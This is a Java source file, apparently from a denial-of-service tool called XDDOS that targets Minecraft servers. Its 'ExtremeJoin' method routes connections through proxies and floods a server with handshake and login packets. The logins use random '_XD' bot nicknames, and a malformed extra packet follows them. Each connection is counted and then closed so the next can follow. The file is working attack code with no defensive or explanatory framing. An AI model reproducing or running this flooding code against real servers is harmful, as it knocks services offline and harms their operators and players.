package XD.XDDOS.methods.impl;

import XD.XDDOS.XDDOS;
import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.packet.Handshake;
import XD.XDDOS.utils.packet.LoginRequest;
import XD.XDDOS.utils.proxy.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;
import java.nio.charset.Charset;
import java.security.SecureRandom;
import java.util.Random;

public class ExtremeJoin
  implements IMethod {
  private byte[] handshakebytes = (new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2)).getWrappedPacket();
  SecureRandom r;
  String lol;
  final int a;

  public ExtremeJoin() {
    this.a = Integer.parseInt(System.getProperty("len", "25555"));
    byte[] array = new byte[14];
    (new Random()).nextBytes(array);
    String generatedString = new String(array, Charset.forName("UTF-8"));
    this.lol = generatedString;
  }
  public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {
    while ((paramInt & 0xFFFFFF80) != 0) {
      out.writeByte(paramInt & 0x7F | 0x80);
      paramInt >>>= 7;
    }
    out.writeByte(paramInt);
  }


  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream out = new ByteBufOutputStream(b);
    try {
      channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshakebytes));
      channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(String.valueOf((new SecureRandom()).nextInt(999999)+"_XD"))).getWrappedPacket()));
      String nick = this.lol+"_XD";
      out.write(nick.length() + 2);
      out.write(0);
      out.write(nick.length());
      out.writeBytes(nick);
      out.close();
    }
    catch (IOException e) {
      e.printStackTrace();
    }
    channel.writeAndFlush(b);
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
    channel.close();
  }
}
